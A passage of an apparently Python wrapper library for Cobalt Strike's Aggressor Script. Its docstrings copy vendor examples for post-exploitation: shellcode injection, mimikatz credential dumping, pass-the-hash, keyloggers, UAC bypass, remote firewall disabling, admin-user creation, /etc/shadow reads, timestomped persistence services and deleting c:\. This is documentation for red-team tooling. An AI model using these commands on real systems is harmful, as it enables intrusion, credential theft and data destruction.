    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get information from a Beacon session's metadata.
        Arguments
        $1 - the id for the beacon to pull metadata for
        $2 - the key to extract
        Returns
        A string with the requested information.
        Example
        
        println("User is: " . binfo("1234", "user"));
        println("PID  is: " . binfo("1234", "pid"));
        
    """

    return engine.call('binfo', args, fork=fork)


def binject(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to inject a session into a specific process
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process to inject the session into
        $3 - the listener to target.
        $4 - the process architecture (x86 | x64)
        Example
        
        binject($1, 1234, "my listener");
        
    """

    return engine.call('binject', args, fork=fork)


def binjectsh(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Inject shellcode into a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject
        $3 - x86|x64 - the architecture of the target process
        $3 - the local path to the file containing the shellcode.
        Example
        
        binjectsh($1, 1234, "x86", script_resource("test.bin"));
        
    """

    return engine.call('binjectsh', args, fork=fork)


def binput(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        
        # indicate the user ran the ls command
        binput($1, "ls");
        
    """

    return engine.call('binput', args, fork=fork)


def bipconfig(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Task a Beacon to list network interfaces.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - callback function with the ipconfig results. Arguments to the callback are: $1 = beacon ID, $2 = results
        Example
        
        alias ipconfig {
            bipconfig($1, {
                blog($1, "Network information is:\n $+ $2");
            });
        }
        
    """

    return engine.call('bipconfig', args, fork=fork)


def bjobkill(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to kill a running post-exploitation job
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the job ID.
        Example
        
        bjobkill($1, 0);
        
    """

    return engine.call('bjobkill', args, fork=fork)


def bjobs(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to list running post-exploitation jobs.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        bjobs($1);
        
    """

    return engine.call('bjobs', args, silent=silent, fork=fork)


def bkerberos_ccache_use(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path the ccache file
        Example
        
        alias kerberos_ccache_use {
            bkerberos_ccache_use($1, $2);
        }
        
    """

    return engine.call('bkerberos_ccache_use', args, fork=fork)


def bkerberos_ticket_purge(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask beacon to purge tickets from the user's kerberos tray
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        alias kerberos_ticket_purge {
            bkerberos_ticket_purge($1);
        }
        
    """

    return engine.call('bkerberos_ticket_purge', args, fork=fork)


def bkerberos_ticket_use(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path the kirbi file
        Example
        
        alias kerberos_ticket_use {
            bkerberos_ticket_use($1, $2);
        }
        
    """

    return engine.call('bkerberos_ticket_use', args, fork=fork)


def bkeylogger(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Injects a keystroke logger into a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject the keystroke logger into.
        $3 - the architecture of the target PID (x86|x64)
        Example
        
        bkeylogger($1, 1234, "x64");
        
    """

    return engine.call('bkeylogger', args, silent=silent, fork=fork)


def bkill(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to kill a process
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to kill
        Example
        
        bkill($1, 1234);
        
    """

    return engine.call('bkill', args, silent=silent, fork=fork)


def blink(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to link to a host over a named pipe
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to link to
        Example
        
        blink($1, "DC");
        
    """

    return engine.call('blink', args, fork=fork)


def blog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Post a message to WordPress.com (just kidding). Publishes an output message to the Beacon transcript.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        
        alias demo {
            blog($1, "I am output for the blog function");
        }
        
    """

    return engine.call('blog', args, fork=fork)


def blog2(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Publishes an output message to the Beacon transcript. This function has an alternate format from &blog
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        
        alias demo2 {
            blog2($1, "I am output for the blog2 function");
        }
        
    """

    return engine.call('blog2', args, fork=fork)


def bloginuser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to create a token from the specified credentials. This is the make_token command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password
        Example
        
        # make a token for a user with an empty password
        alias make_token_empty {
            local('$domain $user');
            ($domain, $user) = split("\\\\", $2);]
            bloginuser($1, $domain, $user, "");
        }
        
    """

    return engine.call('bloginuser', args, fork=fork)


def blogonpasswords(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to dump in-memory credentials with mimikatz
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "Dump &Passwords" {
            binput($1, "logonpasswords");
            blogonpasswords($1);
        }
        
    """

    return engine.call('blogonpasswords', args, silent=silent, fork=fork)


def bls(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Task a Beacon to list files
        Variations
        
        bls($1, "folder");
        
        Output the results to the Beacon console.
        
        bls($1, "folder", &callback);
        
        Route results to the specified callback function.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the folder to list files for. Use . for the current folder.
        $3 - an optional callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = the folder, $3 = results
        Example
        
        on beacon_initial {
            bls($1, ".");
        }
        
    """

    return engine.call('bls', args, fork=fork)


def bmimikatz(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a mimikatz command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Example
        
        alias coffee {
            bmimikatz($1, "standard::coffee");
        }
        
    """

    return engine.call('bmimikatz', args, fork=fork)


def bmkdir(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to make a directory
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the folder to create
        Example
        
        bmkdir($1, "you are owned");
        
    """

    return engine.call('bmkdir', args, silent=silent, fork=fork)


def bmode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Change the data channel for a DNS Beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the data channel (e.g., dns, dns6, dns-txt, or http)
        Example
        
        item "Mode DNS-TXT" {
            binput($1, "mode dns-txt");
            bmode($1, "dns-txt");
        }
        
    """

    return engine.call('bmode', args, fork=fork)


def bmv(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to move a file or folder.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file or folder to move
        $3 - the destination
        Example
        
        bmv($1, "evil.exe", "\\\\target\\\C$\\evil.exe");
        
    """

    return engine.call('bmv', args, fork=fork)


def bnet(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Run a command from Beacon's net module.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command to run.
        
        
        Type
        Description
        
        
        computers
        lists hosts in a domain (groups)
        
        
        dclist
        lists domain controllers
        
        
        domain_trusts
        lists domain trusts
        
        
        group
        lists groups and users in groups
        
        
        localgroup
        lists local groups and users in local groups
        
        
        logons
        lists users logged onto a host
        
        
        sessions
        lists sessions on a host
        
        
        share
        lists shares on a host
        
        
        user
        lists users and user information
        
        
        time
        show time for a host
        
        
        view
        lists hosts in a domain (browser service)
        
        
        $3 - the target to run this command against or $null
        $4 - the parameter to this command (e.g., a group name)
        Example
        
        # ladmins [target]
        #   find the local admins for a target
        alias ladmins {
            bnet($1, "localgroup", $2, "administrators");
        }
        
    """

    return engine.call('bnet', args, silent=silent, fork=fork)


def bnote(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Assign a note to the specified Beacon.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the note content
        Example
        
        bnote($1, "foo");
        
    """

    return engine.call('bnote', args, fork=fork)


def bpassthehash(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password hash
        Example
        
        bpassthehash($1, "GLITTER", "Administrator", $hash);
        
    """

    return engine.call('bpassthehash', args, fork=fork)


def bpause(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to pause its execution. This is a one-off sleep.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - how long the Beacon should pause execution for (milliseconds)
        Example
        
        alias pause {
            bpause($1, int($2));
        }
        
    """

    return engine.call('bpause', args, fork=fork)


def bportscan(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run its port scanner.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the targets to scan (e.g., 192.168.12.0/24)
        $3 - the ports to scan (e.g., 1-1024,6667)
        $4 - the discovery method to use (arp|icmp|none)
        $5 - the max number of sockets to use (e.g., 1024)
        Example
        
        bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024);
        
    """

    return engine.call('bportscan', args, fork=fork)


def bpowerpick(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Spawn a process, inject Unmanaged PowerShell, and run the specified command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the cmdlet and arguments
        Example
        
        # get the version of PowerShell available via Unmanaged PowerShell
        alias powerver {
            bpowerpick($1, '$PSVersionTable.PSVersion');
        }
        
    """

    return engine.call('bpowerpick', args, silent=silent, fork=fork)


def bpowershell(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a PowerShell cmdlet
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the cmdlet and arguments
        Example
        
        # get the version of PowerShell...
        alias powerver {
            bpowershell($1, '$PSVersionTable.PSVersion');
        }
        
    """

    return engine.call('bpowershell', args, silent=silent, fork=fork)


def bpowershell_import(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Import a PowerShell script into a Beacon
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the path to the local file to import
        Example
        
        # quickly run PowerUp
        alias powerup {
            bpowershell_import($1, script_resource("PowerUp.ps1"));
            bpowershell($1, "Invoke-AllChecks");
        }
        
    """

    return engine.call('bpowershell_import', args, silent=silent, fork=fork)


def bppid(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Set a parent process for Beacon's child processes
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the parent process ID. Specify 0 to reset to default behavipr.
        Notes
        1. The current session must have rights to access the specified parent process.
        2. Attempts to spawn post-ex jobs under parent processes in another desktop session may fail. This limitation is due to how Beacon launches its "temporary" processes for post-exploitation jobs and injects code into them.
        Example
        
        # getexplorerpid($bid, &callback);
        sub getexplorerpid {
            bps($1, lambda({
                local('$pid $name $entry');
                foreach $entry (split("\n", $2)) {
                    ($name, $null, $pid) = split("\\s+", $entry);
                    if ($name eq "explorer.exe") {
                        [$callback: $1, $pid];
                    }
                }
            }, $callback => $2));
        }
        
        alias prepenv {
            btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
            getexplorerpid($1, {
                bppid($1, $2);
            });
        }
        
    """

    return engine.call('bppid', args, fork=fork)


def bps(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Task a Beacon to list processes
        Variations
        
        bps($1);
        
        Output the results to the Beacon console.
        
        bps($1, &callback);
        
        Route results to the specified callback function.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - an optional callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = results
        Example
        
        on beacon_initial {
            bps($1);
        }
        
    """

    return engine.call('bps', args, fork=fork)


def bpsexec(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it. Clean up is included too.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to spawn a payload onto
        $3 - the listener to spawn
        $4 - the share to copy the executable to
        Example
        
        brev2self();
        bloginuser($1, "CORP", "Administrator", "toor");
        bpsexec($1, "172.16.48.3", "my listener", "ADMIN\$");
        
    """

    return engine.call('bpsexec', args, fork=fork)


def bpsexec_command(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to run the command on
        $3 - the name of the service to create
        $4 - the command to run.
        Example
        
        # disable the firewall on a remote target
        # beacon> shieldsdown [target]
        alias shieldsdown {
            bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
        }
        
    """

    return engine.call('bpsexec_command', args, fork=fork)


def bpsexec_psh(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a payload on a remote host. This function creates a service to run a PowerShell one-liner.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to spawn a payload onto
        $3 - the listener to spawn
        Example
        
        brev2self();
        bloginuser($1, "CORP", "Administrator", "toor");
        bpsexec_psh($1, "172.16.48.3", "my listener");
        
    """

    return engine.call('bpsexec_psh', args, fork=fork)


def bpsinject(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Inject Unmanaged PowerShell into a specific process and run the specified cmdlet
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process to inject the session into
        $3 - the process architecture (x86 | x64)
        $3 - the cmdlet to run
        Example
        
        bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
        
    """

    return engine.call('bpsinject', args, fork=fork)


def bpwd(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to print its current working directory
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        alias pwd {
            bpwd($1);
        }
        
    """

    return engine.call('bpwd', args, silent=silent, fork=fork)


def breg_query(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to query a key within the registry.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the path to the key
        $3 - x86|x64 - which view of the registry to use
        Example
        
        alias typedurls {
            breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
        }
        
    """

    return engine.call('breg_query', args, fork=fork)


def breg_queryv(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to query a value within a registry key.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the path to the key
        $3 - the name of the value to query
        $4 - x86|x64 - which view of the registry to use
        Example
        
        alias winver {
            breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
        }
        
    """

    return engine.call('breg_queryv', args, fork=fork)


def brev2self(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        alias rev2self {
            brev2self($1);
        }
        
    """

    return engine.call('brev2self', args, fork=fork)


def brm(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to remove a file or folder.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file or folder to remove
        Example
        
        # nuke the system
        brm($1, "c:\\");
        
    """

    return engine.call('brm', args, silent=silent, fork=fork)


def brportfwd(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to setup a reverse port forward.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port to bind to on the target
        $3 - the host to forward connections to
        $4 - the port to forward connections to
        Example
        
        brportfwd($1, 80, "192.168.12.88", 80);
        
    """

    return engine.call('brportfwd', args, fork=fork)


def brportfwd_stop(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to stop a reverse port forward
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port bound on the target
        Example
        
        brportfwd_stop($1, 80);
        
    """

    return engine.call('brportfwd_stop', args, fork=fork)


def brunas(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a command as another user.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password
        $5 - the command to run
        Example
        
        brunas($1, "CORP", "Administrator", "toor", "notepad.exe");
        
    """

    return engine.call('brunas', args, fork=fork)


def brunasadmin(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a command in a high-integrity context (bypasses UAC).
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and its arguments.
        Notes
        This command uses the Token Duplication UAC bypass. This bypass has a few requirements:
        
        Your user must be a local admin
        If Always Notify is enabled, an existing high integrity process must be running in the current desktop session.
        
        Example
        
        # disable the firewall
        brunasadmin($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
        
    """

    return engine.call('brunasadmin', args, fork=fork)


def brunu(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a process under another process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID of the parent process
        $3 - the command + arguments to run
        Example
        
        brunu($1, 1234, "notepad.exe");
        
    """

    return engine.call('brunu', args, fork=fork)


def bscreenshot(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to take a screenshot
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - how long to take the screenshot for
        Example
        
        item "&Screenshot" {
            binput($1, "screenshot");
            bscreenshot($1, 0);
        }
        
    """

    return engine.call('bscreenshot', args, silent=silent, fork=fork)


def bsetenv(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to set an environment variable
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the environment variable to set
        $3 - the value to set the environment variable to (specify $null to unset the variable)
        Example
        
        alias tryit {
            bsetenv($1, "foo", "BAR!");
            bshell($1, "echo %foo%");
        }
        
    """

    return engine.call('bsetenv', args, fork=fork)


def bshell(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a command with cmd.exe
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Example
        
        alias adduser {
            bshell($1, "net user $2 B00gyW00gy1234! /ADD");
            bshell($1, "net localgroup \"Administrators\" $2 /ADD");
        }
        
    """

    return engine.call('bshell', args, silent=silent, fork=fork)


def bshinject(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Inject shellcode (from a local file) into a specific process
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID of the process to inject into
        $3 - the process architecture (x86 | x64)
        $4 - the local file with the shellcode
        Example
        
        bshinject($1, 1234, "x86", "/path/to/stuff.bin");
        
    """

    return engine.call('bshinject', args, fork=fork)


def bshspawn(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process architecture (x86 | x64)
        $3 - the local file with the shellcode
        Example
        
        bshspawn($1, "x86", "/path/to/stuff.bin");
        
    """

    return engine.call('bshspawn', args, fork=fork)


def bsleep(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to change its beaconing interval and jitter factor.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the number of seconds between beacons.
        $3 - the jitter factor [0-99]
        Example
        
        alias stealthy {
            # sleep for 1 hour with 30% jitter factor
            bsleep($1, 60 * 60, 30);
        }
        
    """

    return engine.call('bsleep', args, silent=silent, fork=fork)


def bsocks(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Start a SOCKS proxy server associated with a beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port to bind to
        Example
        
        alias socks1234 {
            bsocks($1, 1234);
        }
        
    """

    return engine.call('bsocks', args, fork=fork)


def bsocks_stop(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Stop SOCKS proxy servers associated with the specified Beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        alias stopsocks {
            bsocks_stop($1);
        }
        
    """

    return engine.call('bsocks_stop', args, fork=fork)


def bspawn(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a new session
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the listener to target.
        $3 - the architecture to spawn a process for (defaults to x86)
        Example
        
        item "&Spawn" {
            openPayloadHelper(lambda({
                binput($bids, "spawn x86 $1");
                bspawn($bids, $1, "x86");
            }, $bids => $1));
        }
        
    """

    return engine.call('bspawn', args, fork=fork)


def bspawnas(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a session as another user.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password
        $5 - the listener to spawn
        Example
        
        bspawnas($1, "CORP", "Administrator", "toor", "my listener");
        
    """

    return engine.call('bspawnas', args, fork=fork)


def bspawnto(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Change the default program Beacon spawns to inject capabilities into.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the program to spawn
        $3 - the architecture we're modifying the spawnto setting for (x86, x64)
        Notes
        The value you specify for spawnto has to work from x86->x86, x86->x64, x64->x86, and x64->x86 contexts. This is tricky. Follow these rules and you'll be OK:
        1. Always specify the full path to the program you want Beacon to spawn for its post-ex jobs.
        2. Environment variables (e.g., %windir%) are OK within these paths.
        3. Do not specify %windir%\system32 or c:\windows\system32 directly. Always use syswow64 (x86) and sysnative (x64). Beacon will adjust these values to system32 if it's necessary.
        4. For an x86 spawnto value, you must specify an x86 program. For an x64 spawnto value, you must specify an x64 program.
        Example
        
        # let's make everything lame.
        on beacon_initial {
            bspawnto($1, "%windir%\\syswow64\\notepad.exe", "x86");
            bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
        }
        
    """

    return engine.call('bspawnto', args, fork=fork)


def bspawnu(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a session under another process. This builds on &brunu and uses powershell.exe.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process to spawn this session under
        $3 - the listener to spawn
        Example
        
        bspawnu($1, 1234, "my listener");
        
    """

    return engine.call('bspawnu', args, fork=fork)


def bssh(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn an SSH session.
        Arguments
        $1 - id for the beacon. This may be an array or a single ID.
        $2 - IP address or hostname of the target
        $3 - port (e.g., 22)
        $4 - username
        $5 - password
        Example
        
        bssh($1, "172.16.20.128", 22, "root", "toor");
        
    """

    return engine.call('bssh', args, fork=fork)


def bssh_key(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn an SSH session.
        Arguments
        $1 - id for the beacon. This may be an array or a single ID.
        $2 - IP address or hostname of the target
        $3 - port (e.g., 22)
        $4 - username
        $5 - key data (as a string)
        Example
        
        $handle = openf("/path/to/key.pem");
        $keydata = readb($handle, -1);
        closef($handle);
        
        bssh_key($1, "172.16.20.128", 22, "root", $keydata);
        
    """

    return engine.call('bssh_key', args, fork=fork)


def bstage(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        This function handles the staging process for a bind listener. If the specified listener is not a bind listener, this function does nothing. Otherwise, it completes the staging protocol over a named pipe or a local socket.
        Arguments
        $1 - the id of the beacon to stage through
        $2 - the target host to stage to [bind_pipe] or $null for localhost [bind_tcp]
        $3 - the listener to stage
        $4 - the architecture of the payload stage (x86, x64)
        Example
        
        # stage [target] [listener name]
        alias stage {
            bstage($1, $2, $3, "x86");
        }
        
    """

    return engine.call('bstage', args, fork=fork)


def bsteal_token(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to steal a token from a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to take the token from
        Example
        
        alias steal_token {
            bsteal_token($1, int($2));
        }
        
    """

    return engine.call('bsteal_token', args, fork=fork)


def bsudo(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to run a command via sudo (SSH sessions only)
        Arguments
        $1 - the id for the session. This may be an array or a single ID.
        $2 - the password for the current user
        $3 - the command and arguments to run
        Example
        
        # hashdump [password]
        ssh_alias hashdump {
            bsudo($1, $2, "cat /etc/shadow");
        }
        
    """

    return engine.call('bsudo', args, fork=fork)


def btask(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        $3 - a string with MITRE ATT&CK Tactic IDs. Use a comma and a space to specify multiple IDs in one string.
        https://attack.mitre.org
        Example
        
        alias foo {
            btask($1, "User tasked beacon to foo", "T1015");
        }
        
    """

    return engine.call('btask', args, fork=fork)


def btimestomp(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to change the file modified/accessed/created times to match another file.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file to update timestamp values for
        $3 - the file to grab timestamp values from
        Example
        
        alias persist {
            bcd($1, "c:\\windows\\system32");
            bupload($1, script_resource("evil.exe"));
            btimestomp($1, "evil.exe", "cmd.exe");
            bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
            bshell($1, 'sc start netsrv');
        }
        
    """

    return engine.call('btimestomp', args, silent=silent, fork=fork)


def bunlink(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
